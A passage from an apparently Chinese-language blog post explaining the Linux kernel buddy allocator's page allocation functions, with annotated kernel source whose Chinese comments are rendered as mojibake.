class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¯¹ç»™å®šçš„ migrationtype éå† free lists </span><br><span class="hljs-comment"> * å¹¶ä» freelists ä¸Šç§»é™¤æœ€å°å¯ç”¨çš„é¡µé¢</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">rmqueue_smallest</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>,</span><br><span class="hljs-class"><span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> current_order;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> *<span class="hljs-title">area</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-comment">/* åœ¨ preferred list ä¸Šå¯»æ‰¾ä¸€ä¸ªåˆé€‚ size çš„ page */</span><br><span class="hljs-keyword">for</span> (current_order = order; current_order &lt; MAX_ORDER; ++current_order) &#123;<br>area = &amp;(zone-&gt;free_area[current_order]);<br>page = get_page_from_free_area(area, migratetype);<br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">continue</span>;<br>del_page_from_free_list(page, zone, current_order);<br>expand(zone, page, order, current_order, migratetype);<br>set_pcppage_migratetype(page, migratetype);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>expand()</code> çš„é€»è¾‘å°±æ¯”è¾ƒç®€å•ï¼Œä»é«˜é˜¶ order ä¸€ç›´å¾ªç¯åˆ°å¾…åˆ†é…çš„ orderï¼š</p><ul><li>é¦–å…ˆé«˜é˜¶ orderâ€“ï¼Œä¹‹åé¡µé¢æ‹†ä¸¤åŠï¼ŒæŠŠååŠéƒ¨åˆ†æŒ‚åˆ°é“¾è¡¨ä¸Šï¼Œå‰åŠéƒ¨åˆ†ç•™åˆ°ä¸‹æ¬¡å¾ªç¯ç»§ç»­æ‹†</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ­¤å¤„å†åˆ†å‰²çš„é¡ºåºå¯¹ IO subsystem è€Œè¨€æ˜¯ååˆ†é‡è¦çš„.</span><br><span class="hljs-comment"> * è¯·ä¸è¦åœ¨æœ‰å¥½çš„ç†ç”±åŠå›å½’æµ‹è¯•å‰æ”¹å˜è¿™ä¸ªé¡ºåºã€‚</span><br><span class="hljs-comment"> * ç‰¹åˆ«åœ°ï¼Œå½“å¤§å—çš„å†…å­˜è¢«åˆ†å‰²ï¼Œæ›´å°å—ï¼ˆå†…å­˜ï¼‰è¢«ä¼ é€’çš„é¡ºåº</span><br><span class="hljs-comment"> * åˆ™ç”±ä»–ä»¬åœ¨è¯¥å‡½æ•°ä¸­è¢«åˆ†å‰²çš„é¡ºåºå†³å®šã€‚</span><br><span class="hljs-comment"> * æ ¹æ®å®é™…æµ‹è¯•ï¼Œè¿™æ˜¯å½±å“ä¼ é€’ç»™IOå­ç³»ç»Ÿçš„ pages é¡ºåºçš„ä¸»è¦å› ç´ ï¼Œ</span><br><span class="hljs-comment"> * è€ƒè™‘åˆ°åŒ…å«ä¸€ä¸ªå†…å­˜å¤§å—ï¼ˆç”±ä¸€ç³»åˆ—å°çš„åˆ†é…ä½œç”¨ï¼‰çš„ buddy system çš„è¡Œä¸ºï¼Œ</span><br><span class="hljs-comment"> * è¿™ä¹Ÿæ˜¯åˆç†çš„ã€‚è¿™ç§è¡Œä¸ºæ˜¯ sglist åˆå¹¶æˆåŠŸçš„å…³é”®å› ç´ ã€‚</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * -- nyc</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">expand</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-keyword">struct</span> page *page,</span><br><span class="hljs-params"><span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high, <span class="hljs-type">int</span> migratetype)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size = <span class="hljs-number">1</span> &lt;&lt; high;<br><br><span class="hljs-keyword">while</span> (high &gt; low) &#123;<br>high--;<br>size &gt;&gt;= <span class="hljs-number">1</span>;<br>VM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ ‡è®°ä¸º guard pages (æˆ– page), è¿™å°†å…è®¸åœ¨ buddy å°†è¢«</span><br><span class="hljs-comment"> * é‡Šæ”¾æ—¶åˆå¹¶å›åˆ†é…å™¨.å¯¹åº”çš„é¡µè¡¨é¡¹ä¸ä¼šè¢«åˆ›å»ºï¼Œ</span><br><span class="hljs-comment"> * pages åœ¨ è™šæ‹Ÿåœ°å€ç©ºé—´ä¸Šä»å°†ä¿æŒä¸å­˜åœ¨ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (set_page_guard(zone, &amp;page[size], high, migratetype))<br><span class="hljs-keyword">continue</span>;<br><br>add_to_free_list(&amp;page[size], zone, high, migratetype);<br>set_buddy_order(&amp;page[size], high);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="â‘¢-rmqueue-ï¼šåˆ†é…å°è£…å‡½æ•°">â‘¢ __rmqueue()ï¼šåˆ†é…å°è£…å‡½æ•°</h5><p>è¿™ä¸ªå‡½æ•°å…¶å®ä¸»è¦æ˜¯å¯¹å…¶ä»–åˆ†é…å‡½æ•°çš„å°è£…ï¼Œæœ€ç»ˆçš„æ ¸å¿ƒå‡½æ•°å…¶å®éƒ½è¿˜æ˜¯ <code>__rmqueue_smallest()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä» buddy allocator ä¸Šç§»é™¤ä¸€ä¸ªå…ƒç´ .</span><br><span class="hljs-comment"> * åœ¨æŒæœ‰ zone-&gt;lock æ—¶è°ƒç”¨.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">rmqueue</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>, <span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>,</span><br><span class="hljs-class"><span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_CMA)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é€šè¿‡å½“åŠæ•°ç©ºé—²å†…å­˜åœ¨ CMA åŒºåŸŸæ—¶ä» CMA ä¸­åˆ†é…</span><br><span class="hljs-comment"> * ä»¥å¹³è¡¡å¸¸è§„çš„ä¸CMAåŒºåŸŸçš„å¯è¿ç§»çš„åˆ†é…ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_CMA &amp;&amp;<br>    zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;<br>    zone_page_state(zone, NR_FREE_PAGES) / <span class="hljs-number">2</span>) &#123;<br>page = __rmqueue_cma_fallback(zone, order);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br>retry:<br>page = __rmqueue_smallest(zone, order, migratetype);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_CMA)<br>page = __rmqueue_cma_fallback(zone, order);<br><br><span class="hljs-keyword">if</span> (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,<br>alloc_flags))<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>out:<br><span class="hljs-keyword">if</span> (page)<br>trace_mm_page_alloc_zone_locked(page, order, migratetype);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p>æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>è‹¥å¼€å¯äº† CMAï¼Œæ¯”å¯¹å¸¸è§„åŒºåŸŸä¸ CMA åŒºåŸŸçš„ç©ºé—²é¡µé¢æ•°é‡ï¼Œè‹¥ CMA çš„å¤šåˆ™è°ƒç”¨ <code>__rmqueue_cma_fallback()</code> ä» CMA åŒºåŸŸåˆ†é…ï¼ˆå…¶å®å°±æ˜¯è°ƒç”¨ <code>__rmqueue_smallest()</code> ä»è¿ç§»ç±»å‹ä¸º <code>MIGRATE_CMA</code> çš„é“¾è¡¨ä¸Šåˆ†é…ï¼‰ï¼ŒæˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>è°ƒç”¨ <code>__rmqueue_smallest()</code> ä»æŒ‡å®šè¿ç§»ç±»å‹é“¾è¡¨è¿›è¡Œåˆ†é…ï¼Œè‹¥æœªæˆåŠŸï¼š<ul><li>è‹¥è®¾ç½®äº† <code>ALLOC_CMA</code> çš„åˆ†é… flagï¼Œè°ƒç”¨ <code>__rmqueue_cma_fallback()</code> ä» CMA åŒºåŸŸè¿›è¡Œåˆ†é…</li><li>è‹¥ä¸Šä¸€æ­¥å¤±è´¥åˆ™è°ƒç”¨ <code>__rmqueue_fallback()</code> å°è¯•ä»å…¶ä»–è¿ç§»ç±»å‹é“¾è¡¨è·å–é¡µé¢ï¼Œè‹¥è¿˜æ˜¯å¤±è´¥åˆ™é‡è¯•è¿™ä¸€ä¸ªå¤§æ­¥éª¤</li></ul></li></ul><h3 id="III-alloc-pages-slowpath-ï¼šæ…¢é€Ÿåˆ†é…è·¯å¾„">III. __alloc_pages_slowpath()ï¼šæ…¢é€Ÿåˆ†é…è·¯å¾„</h3><p>å½“å¿«é€Ÿè·¯å¾„çš„åˆ†é…ä¸æˆåŠŸæ—¶ï¼Œè¯´æ˜ç³»ç»Ÿå½“å‰å¯èƒ½å·²ç»æ²¡æœ‰è¶³å¤Ÿçš„è¿ç»­çš„ç©ºé—²é¡µé¢ï¼Œè¿™æ—¶æˆ‘ä»¬å°±è¦è¿›å…¥åˆ°æ…¢é€Ÿè·¯å¾„çš„åˆ†é…ï¼Œ<strong>è¿›è¡Œå†…å­˜ç¢ç‰‡æ•´ç†ä¸å†…å­˜å›æ”¶</strong>ï¼Œä¹‹åå†è¿›è¡Œåˆ†é…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">alloc_pages_slowpath</span>(<span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> *<span class="hljs-title">ac</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">bool</span> can_direct_reclaim = gfp_mask &amp; __GFP_DIRECT_RECLAIM;<br><span class="hljs-type">const</span> <span class="hljs-type">bool</span> costly_order = order &gt; PAGE_ALLOC_COSTLY_ORDER;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> did_some_progress;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">compact_priority</span> <span class="hljs-title">compact_priority</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">compact_result</span> <span class="hljs-title">compact_result</span>;</span><br><span class="hljs-type">int</span> compaction_retries;<br><span class="hljs-type">int</span> no_progress_loops;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpuset_mems_cookie;<br><span class="hljs-type">int</span> reserve_flags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬è¿˜è¿›è¡Œäº†å¥å…¨æ€§æ£€æŸ¥ï¼Œä»¥å‘ç°éåŸå­ä¸Šä¸‹æ–‡ä¸­çš„ caller æ»¥ç”¨åŸå­å‚¨å¤‡ï¼ˆçš„è¡Œä¸ºï¼‰ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE((gfp_mask &amp; (__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)) ==<br>(__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)))<br>gfp_mask &amp;= ~__GFP_ATOMIC;<br><br>retry_cpuset:<br>compaction_retries = <span class="hljs-number">0</span>;<br>no_progress_loops = <span class="hljs-number">0</span>;<br>compact_priority = DEF_COMPACT_PRIORITY;<br>cpuset_mems_cookie = read_mems_allowed_begin();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä»…åœ¨ kswapd éœ€è¦è¢«å”¤é†’å‰ï¼Œå¿«é€Ÿè·¯å¾„ä½¿ç”¨ä¿å®ˆçš„ alloc_flags æ‰èƒ½æˆåŠŸï¼Œ</span><br><span class="hljs-comment"> * å¹¶ä¸”é¿å…ç²¾ç¡®åœ°è®¾ç½® alloc_flagsã€‚ æ‰€ä»¥æˆ‘ä»¬ç°åœ¨è¿™ä¹ˆåšã€‚</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">// é‡æ–°è®¾ç½® alloc_flagsï¼Œå› ä¸ºå¿«é€Ÿè·¯å¾„çš„åˆ†é…åœ¨ kswapd è¢«å”¤é†’ä¹‹å‰</span><br>    <span class="hljs-comment">// åªæœ‰ä½¿ç”¨ä¿å®ˆçš„ alloc_flags æ‰èƒ½æˆåŠŸï¼Œè€Œç°åœ¨æˆ‘ä»¬å°†å”¤é†’ kswapdï¼Œ</span><br>    <span class="hljs-comment">// å› æ­¤æ¢å¤ä½¿ç”¨åŸæœ‰çš„ gfp_mask å¯¹åº”çš„ alloc_flags</span><br>alloc_flags = gfp_to_alloc_flags(gfp_mask);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬éœ€è¦ä¸º zonelist è¿­ä»£å™¨é‡æ–°è®¡ç®—èµ·å§‹ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬å¯èƒ½åœ¨å¿«é€Ÿè·¯å¾„ä¸­</span><br><span class="hljs-comment"> * ä½¿ç”¨äº†ä¸åŒçš„ nodemask ï¼Œæˆ–æ˜¯æœ‰ä¸ª cpuset çš„ä¿®æ”¹è€Œæˆ‘ä»¬æ­£åœ¨é‡è¯•</span><br><span class="hljs-comment"> * - å¦åˆ™æˆ‘ä»¬å¯èƒ½ä¼šæ— ä¼‘æ­¢åœ°è¿­ä»£ä¸åˆæ ¼çš„ zone</span><br><span class="hljs-comment"> */</span><br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br><span class="hljs-keyword">if</span> (!ac-&gt;preferred_zoneref-&gt;zone)<br><span class="hljs-keyword">goto</span> nopage;<br><br>    <span class="hljs-comment">// å¦‚æœ ALLOC_KSWAPDï¼Œå”¤é†’ kswapd çº¿ç¨‹å›æ”¶å†…å­˜</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)<br>wake_all_kswapds(order, gfp_mask, ac);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è°ƒæ•´åçš„ alloc_flags å¯èƒ½ä¼šç«‹å³æˆåŠŸï¼Œæ‰€ä»¥å…ˆè¿›è¡Œå°è¯•</span><br><span class="hljs-comment"> */</span><br>page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¯¹äºä»£ä»·é«˜çš„åˆ†é…, é¦–å…ˆå°è¯•ç›´æ¥çš„ compactionï¼ˆè¯‘æ³¨ï¼šç¢ç‰‡æ•´ç†æœºåˆ¶ï¼‰,</span><br><span class="hljs-comment"> * å› ä¸ºæœ‰å¯èƒ½æˆ‘ä»¬ä»æœ‰è¶³å¤Ÿçš„åŸºæœ¬é¡µé¢ï¼Œå¹¶ä¸éœ€è¦å»å›æ”¶. å¯¹äºä¸å¯è¿ç§»çš„é«˜é˜¶åˆ†é…ï¼Œ</span><br><span class="hljs-comment"> * åŒæ ·è¿™ä¹ˆåš, å› ä¸º compaction å°†å°è¯•é€šè¿‡ä»ç›¸åŒè¿ç§»ç±»å‹çš„å—è¿›è¡Œè¿ç§»</span><br><span class="hljs-comment"> * ä»¥é¿å…æ°¸ä¹…çš„ç¢ç‰‡. åˆ«å¯¹å…è®¸å¿½è§†æ°´ä½çº¿çš„åˆ†é…å°è¯•è¿™ä¸ªï¼Œå› ä¸º</span><br><span class="hljs-comment"> * ALLOC_NO_WATERMARKS è¿˜æ²¡å‘ç”Ÿã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (can_direct_reclaim &amp;&amp;<br>(costly_order ||<br>   (order &gt; <span class="hljs-number">0</span> &amp;&amp; ac-&gt;migratetype != MIGRATE_MOVABLE))<br>&amp;&amp; !gfp_pfmemalloc_allowed(gfp_mask)) &#123;<br>page = __alloc_pages_direct_compact(gfp_mask, order,<br>alloc_flags, ac,<br>INIT_COMPACT_PRIORITY,<br>&amp;compact_result);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ£€æŸ¥å¸¦æœ‰ __GFP_NORETRY çš„ä»£ä»·é«˜çš„åˆ†é…, å…¶</span><br><span class="hljs-comment"> * åŒ…æ‹¬ä¸€äº› THP page fault çš„åˆ†é…</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (costly_order &amp;&amp; (gfp_mask &amp; __GFP_NORETRY)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥åˆ†é…æ•´ä¸ª pageblock(s) ä¸” compaction ç”±äºæ‰€æœ‰çš„ zone</span><br><span class="hljs-comment"> * éƒ½åœ¨æ°´ä½çº¿ä¸‹å¤±è´¥äº†ï¼Œæˆ–æ˜¯è¢«ç¦æ­¢äº†å› ä¸ºå…¶æœ€è¿‘åœ¨è¯¥orderä¸Šå¤±è´¥äº†ï¼Œ</span><br><span class="hljs-comment"> * é™¤éåˆ†é…å™¨æœ‰è¯·æ±‚çš„ compaction ä¸å›æ”¶å°è¯•ï¼Œå¦åˆ™ç›´æ¥å¤±è´¥</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å›æ”¶æ˜¯ï¼š</span><br><span class="hljs-comment"> *  - å¯èƒ½éå¸¸æ˜‚è´µå› ä¸º zones å¯èƒ½è¿œä½äºä»–ä»¬çš„ä½æ°´ä½çº¿ï¼Œ</span><br><span class="hljs-comment"> *    æˆ–æ˜¯è¿™æ˜¯éå¸¸çªå‘çš„é«˜é˜¶åˆ†é…çš„ä¸€éƒ¨åˆ†,</span><br><span class="hljs-comment"> *  - ä¸ä¸€å®šä¼šæœ‰å¸®åŠ©å› ä¸º isolate_freepages() å¯èƒ½ä¸ä¼šåœ¨</span><br><span class="hljs-comment"> *    è¢«é‡Šæ”¾çš„é¡µé¢ä¸Šè¿­ä»£ä½œä¸ºå…¶çº¿æ€§æ‰«æçš„ä¸€éƒ¨åˆ†ï¼Œä¸”</span><br><span class="hljs-comment"> *  - ä¸å¤§å¯èƒ½ä¼šè®©æ•´ä¸ª pageblocks è‡ªå·±é‡Šæ”¾</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (compact_result == COMPACT_SKIPPED ||<br>    compact_result == COMPACT_DEFERRED)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * çœ‹èµ·æ¥å¥½åƒ reclaim/compaction æ˜¯å€¼å¾—å°è¯•çš„, ä½†</span><br><span class="hljs-comment"> * åŒæ­¥çš„ compaction å¯èƒ½ä¼šéå¸¸ expensive, æ•…ä¿æŒ</span><br><span class="hljs-comment"> * ä½¿ç”¨å¼‚æ­¥çš„ compaction.</span><br><span class="hljs-comment"> */</span><br>compact_priority = INIT_COMPACT_PRIORITY;<br>&#125;<br>&#125;<br><br>retry:<br><span class="hljs-comment">/* ç¡®ä¿åªè¦æˆ‘ä»¬å¾ªç¯ï¼Œ kswapd ä¾¿ä¸ä¼šæ„å¤–åœ°ä¼‘çœ  */</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)<br>wake_all_kswapds(order, gfp_mask, ac);<br><br>reserve_flags = __gfp_pfmemalloc_flags(gfp_mask);<br><span class="hljs-keyword">if</span> (reserve_flags)<br>alloc_flags = current_alloc_flags(gfp_mask, reserve_flags);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥å†…å­˜ç­–ç•¥å¯ä»¥å¿½ç•¥ï¼Œé‡ç½® nodemask ä¸ zonelist è¿­ä»£å™¨ã€‚</span><br><span class="hljs-comment"> * è¿™äº›åˆ†é…å…·æœ‰é«˜ä¼˜å…ˆçº§ä¸ç³»ç»Ÿæ€§ï¼Œè€Œéç”¨æˆ·å¯¼å‘ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!(alloc_flags 